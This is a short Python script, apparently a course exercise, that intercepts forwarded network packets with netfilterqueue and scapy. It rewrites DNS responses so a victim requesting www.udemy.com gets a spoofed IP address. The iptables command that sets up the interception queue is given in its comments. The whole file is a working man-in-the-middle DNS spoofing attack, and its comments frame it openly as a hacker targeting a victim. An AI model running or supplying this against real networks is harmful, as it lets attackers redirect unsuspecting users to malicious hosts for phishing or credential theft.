import netfilterqueue
import scapy.all as scapy

# 1. iptables -I FORWARD -j NFQUEUE --queue-num 0. This command in terminal creates the NF queue. The queue is accessed in this program
# 2. The program is then run to trap packets in the queue.
# 3. Forward the DNS packet to the actual DNS server. Wait for the response and then modify the packet


def process_packet(packet):

    scapy_packet = scapy.IP(packet.get_payload())

    # looks for DNS responses (resource record) to victim.
    if scapy_packet.haslayer(scapy.DNSRR):

        qname = scapy_packet[scapy.DNSQR].qname

        if 'www.udemy.com' in qname: # hacker wants to spoof DNS request when victim goes to www.udemy.com
            print("[+] Spoofing target. " + qname)

            # craft a fake DNS response. rrname is the website name, rdata is the spoofed IP of www.udemy.com.
            answer = scapy.DNSRR(rrname=qname, rdata="172.217.26.68")
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(str(scapy_packet))

    packet.accept()
    

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()

